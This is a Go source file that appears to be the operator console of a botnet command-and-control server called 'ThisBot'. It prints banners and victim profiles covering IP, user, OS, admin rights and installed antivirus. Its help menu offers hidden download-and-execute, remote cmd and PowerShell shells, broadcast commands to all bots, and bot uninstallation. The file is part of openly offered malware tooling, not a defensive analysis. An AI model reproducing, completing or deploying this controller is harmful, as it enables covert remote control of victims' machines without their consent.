package core

import (
	"ThisBot/common"
	"fmt"
	"strings"
)

func show_banner() {
	var banner string = "\n" + `___________.__    .__       __________        __ ` + "\n" +
		`\__    ___/|  |__ |__| _____\______   \ _____/  |_ ` + "\n" +
		`  |    |   |  |  \|  |/  ___/|    |  _//  _ \   __\` + "\n" +
		`  |    |   |   Y  \  |\___ \ |    |   (  <_> )  |  ` + "\n" +
		`  |____|   |___|  /__/____  >|______  /\____/|__|  ` + "\n" +
		`  	        \/        \/        \/             ` + common.Version + "\n" +
		"                                               Author: Nec0Arc" + "\n"
	fmt.Println(banner)
}

func show_bot_info(bot *common.Client) {
	common.Mutex.Lock()
	defer common.Mutex.Unlock()
	fmt.Printf("👣 ID: %d\n", bot.Id)
	fmt.Println("🏴 Guid: " + bot.Guid)
	fmt.Println("🌐 IP: " + bot.Ip)
	fmt.Println("👽 Who: " + bot.Whoami)
	fmt.Println("💻 OS: " + bot.Os)
	fmt.Println("📅 InstallDate: ", bot.Installdate)
	admin := "yes"
	if bot.Isadmin != admin {
		admin = "no"
	}
	fmt.Println("👽 Admin: " + admin)
	fmt.Println("😈 Anti-Virus: " + bot.Antivirus)
	fmt.Println("🤖 CPU: " + bot.Cpuinfo)
	fmt.Println("🎭 GPU: " + strings.TrimSpace(bot.Gpuinfo))
	fmt.Println("🔬 Lastseen: " + bot.Lastseen)
	fmt.Println("👾 Version: " + bot.Version)
	fmt.Println("🐾 --------------------------------------------------- 🐾")
}

func help_handler() {
	fmt.Println("1. help/h: Show help menu")
	fmt.Println("2. exec [-h] path/url [args]: Execute executable file or download from host and execute, option -h decides if hidden execute")
	fmt.Println("3. cmd/pws: Remote cmd or powershell")
	fmt.Println("4. list: Show all bots")
	fmt.Println("5. info id: Show bot info which ID is id")
	fmt.Println("6. select botid: Select a connected bot to operate")
	fmt.Println("7. clear: Clean the screen")
	fmt.Println("8. mode [broadcast]: Show current mode or switch to broadcast")
	fmt.Println("9. log command: \n  log list: it will show all task logs\n  log del [all/n]: it will delete all records or specific one\n  log export [filename]: If only use 'log export' will generate a .csv file with a timestamp name, or you can specify your own.")
	fmt.Println("10. cancel [task_id/all]: if option is all means cancel all tasks, or just task specfied by taskid")
	fmt.Println("11. task: task [list/export]: \n  task list: it will show all tasks\n  task export [*.csv]: if no specific name then generate a timestamp name, or use your specific name.")
	fmt.Println("12. uninstall: Uninstall the bot")
	fmt.Println("13. exit: Exit server")
}

func tls_banner() {
	fmt.Println(`_________     _____    __________      .__.__       .___            
\_   ___ \   /  _  \   \______   \__ __|__|  |    __| _/___________ 
/    \  \/  /  /_\  \   |    |  _/  |  \  |  |   / __ |/ __ \_  __ \
\     \____/    |    \  |    |   \  |  /  |  |__/ /_/ \  ___/|  | \/
 \______  /\____|__  /  |______  /____/|__|____/\____ |\___  >__|   
        \/         \/          \/                    \/    \/        `)
}
